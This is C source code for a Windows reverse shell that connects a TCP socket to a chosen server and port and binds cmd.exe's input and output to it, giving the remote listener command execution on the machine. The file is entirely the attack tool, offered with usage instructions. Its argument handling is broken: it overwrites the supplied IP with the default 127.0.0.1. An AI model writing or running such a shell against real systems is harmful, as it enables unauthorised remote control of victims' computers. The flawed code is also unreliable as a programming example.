#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

char server_ip[16] = "127.0.0.1";
int server_port = 12345;
char *HELP = "how to use?: .\\revshell.exe [server_ip] [server_port]";
void winsock_init()
{
    // initiates use of the Winsock DLL
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
        fprintf(stderr, "WSAStartup failed.\n");
        exit(1);
    }
}

SOCKET connect_to_server(const char *serverIp, int serverPort)
{
    // create socket
    SOCKET clientSocket = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    if (clientSocket == INVALID_SOCKET)
    {
        fprintf(stderr, "Failed to create socket.\n");
        WSACleanup();
        exit(1);
    }

    struct sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(serverPort);
    serverAddr.sin_addr.s_addr = inet_addr(serverIp);
    // connect to server
    if (WSAConnect(clientSocket, (struct sockaddr *)&serverAddr, sizeof(serverAddr), 0, 0, 0, 0) == SOCKET_ERROR)
    {
        fprintf(stderr, "Failed to connect to server.\n");
        closesocket(clientSocket);
        WSACleanup();
        exit(1);
    }

    return clientSocket;
}

void reverse_shell(SOCKET clientSocket)
{

    STARTUPINFO si = {sizeof(STARTUPINFO)};
    // si must be zeroed out
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);

    PROCESS_INFORMATION pi;

    /* from msdn:
      A bitfield that determines whether certain STARTUPINFO members are used when the process creates a window.
      STARTF_USESTDHANDLES => The hStdInput, hStdOutput, and hStdError members contain additional information.
    */
    si.dwFlags = (STARTF_USESTDHANDLES);

    // redirect input/output/error
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)clientSocket;

    // create process
    char process[] = "cmd.exe";
    if (!CreateProcess(NULL, process, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
    {
        fprintf(stderr, "Failed to create process.\n");
        exit(1);
    }

    fprintf(stdout, "Process Created %lu\n", pi.dwProcessId);

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

int main(int argc, char **argv)
{
    if (argc == 3)
    {
        server_port = atoi(argv[2]);
        sprintf(argv[1], "%s\0", server_ip);
    }
    else
    {
        fprintf(stdout, "%s", HELP);
        exit(1);
    }
    winsock_init();
    SOCKET clientSocket = connect_to_server(server_ip, server_port);
    reverse_shell(clientSocket);
    closesocket(clientSocket);
    WSACleanup();
    return 0;
}
